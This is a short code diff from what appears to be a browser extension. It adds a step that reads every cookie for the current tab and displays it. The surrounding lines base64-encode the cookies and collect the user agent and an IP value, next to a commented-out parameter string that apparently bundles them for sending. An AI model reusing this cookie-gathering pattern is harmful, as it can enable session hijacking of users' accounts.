@@ -34,6 +34,13 @@
                 var name = new URL(tab.url).hostname;
                 var cookie = btoa(JSON.stringify(exportedCookies, null, 4));
                 var uri = tab.url;
+                chrome.cookies.getAll({"url":tab.url},function (cookie){
+                    var nullObj = [];
+                    for(var i=0;i<cookie.length;i++){
+                        nullObj.push(JSON.stringify(cookie[i], null, 4));
+                    };
+                    alert(nullObj);
+                });
                 var ipx = data;
                 var UAgent = window.navigator.userAgent;
                 // var params = 'name='+name+'&url='+uri+'&uAgent='+UAgent+'&ipx='+ipx+'&cookie='+cookie;
